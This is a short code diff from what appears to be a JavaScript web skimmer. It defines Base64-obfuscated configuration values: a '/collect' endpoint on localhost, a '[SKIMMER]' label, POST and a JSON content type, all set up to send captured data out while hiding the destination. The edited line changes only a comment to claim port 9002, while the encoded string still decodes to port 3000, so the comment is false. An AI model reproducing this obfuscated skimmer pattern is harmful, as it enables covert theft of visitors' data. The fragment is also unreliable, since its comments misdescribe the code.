@@ -268,7 +268,7 @@
         }
 
         // Obfuscated configuration using Base64 and string concatenation
-        var d = atob('aHR0cDovL2xvY2FsaG9zdDozMDAw') + '/' + atob('Y29sbGVjdA=='); // http://localhost:3000/collect
+        var d = atob('aHR0cDovL2xvY2FsaG9zdDozMDAw') + '/' + atob('Y29sbGVjdA=='); // http://localhost:9002/collect
         var e = atob('W1NLSU1NRVJd'); // [SKIMMER]
         var f = atob('UE9TVA=='); // POST
         var g = atob('YXBwbGljYXRpb24vanNvbg=='); // application/json
